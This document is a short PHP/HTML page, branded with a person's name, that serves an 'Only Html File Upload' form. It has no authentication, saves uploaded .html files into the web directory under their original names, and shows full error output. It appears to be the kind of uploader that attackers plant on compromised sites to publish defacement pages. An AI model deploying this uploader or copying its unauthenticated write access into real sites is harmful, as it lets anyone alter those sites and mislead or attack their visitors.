<style type="text/css">
body {
    color: #33ff33;
    background-color: white; /* Corrected "while" to "white" */
    font-weight: inherit;
}
h1, h2 {
    background-color: #4D4D4D;
    color: #000000;
    text-align: center;
}
h3, h4, h5 {
    color: silver;
    text-align: center;
}
</style>
<b><br>
<h1>Fahim Shariar</h1>
<h3>Only Html File Upload</h3>
<br><br>
<center>
<font color="blue">
<span style="font-family: monospace;">
<span style="color: rgb(255, 255, 255);">
<br><br>
<font color="black"></font>
<br></b>

<?php
// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50">';
echo '<input name="_upl" type="submit" id="_upl" value="Upload">';
echo '</form>';

if (isset($_POST['_upl']) && $_POST['_upl'] == "Upload") {
    // Define the upload directory (current folder)
    $uploadDirectory = './'; // Upload to the same folder as the script
    $newFileName = basename($_FILES['file']['name']); // Preserve the original file name
    
    // Check file type and extension
    $allowedExtensions = ['html'];
    $fileExtension = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
    
    if (in_array($fileExtension, $allowedExtensions)) {
        // Define the full path for the new file
        $uploadFilePath = $uploadDirectory . $newFileName;

        // Move the uploaded file to the same directory as the script
        if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadFilePath)) {
            echo '<b>File uploaded successfully as ' . htmlspecialchars($newFileName) . '!</b><br><br>';
        } else {
            echo '<b>Upload failed!</b><br><br>';
        }
    } else {
        echo '<b>Invalid file type! Only .html files are allowed.</b><br><br>';
    }
}
?>
